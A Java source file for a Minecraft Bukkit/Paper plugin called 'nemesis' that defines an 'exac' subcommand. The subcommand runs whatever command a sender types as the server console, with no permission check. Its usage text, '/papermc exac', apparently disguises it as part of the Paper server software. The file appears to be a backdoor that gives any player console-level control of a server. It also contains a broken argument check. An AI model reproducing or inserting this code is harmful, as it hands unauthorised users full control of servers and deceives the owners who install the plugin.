package nemesis.commands.subcommands;

import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;

import nemesis.Utils;
import nemesis.commands.SubCommand;

public class Exac implements SubCommand {

    @Override
    public void execute(CommandSender sender, String[] args) {
        if (args.length > 1) {
            if (args[1] == null && args[1].isEmpty()) {
                sender.sendMessage(Utils.colorize("&cPlease specify a command!"));
                return;
            }

            String cmdargs = "";
            for (int i = 2; i < args.length; i++) {
                cmdargs = cmdargs + args[i] + " ";
            }

            if (!cmdargs.isEmpty()) {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), args[1] + " " + cmdargs);
                return;
            }

            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), args[1]);
            sender.sendMessage(Utils.colorize("&aYou have successfully executed the command " + args[1]));
        } else {
            sender.sendMessage(Utils.colorize("&cUsage: /papermc exac <command>"));
        }
    }

    @Override
    public String getName() {
        return "exac";
    }
}